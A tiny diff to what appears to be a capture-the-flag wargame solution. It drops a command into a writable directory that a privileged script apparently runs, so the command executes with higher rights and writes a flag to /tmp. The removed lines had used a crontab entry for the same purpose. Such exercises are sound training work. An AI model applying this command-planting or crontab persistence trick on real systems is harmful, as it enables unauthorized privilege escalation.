@@ -1,3 +1,4 @@
-echo 'echo "* * * * * getflag > /tmp/faaaggggg" | crontab -' > writable.d/lol
-./level07.sh
-cat /tmp/faaaggggg
+echo '/bin/getflag > /tmp/faaaggggg' > writable.d/lol
+until cat /tmp/faaaggggg; do
+	sleep 1;
+done
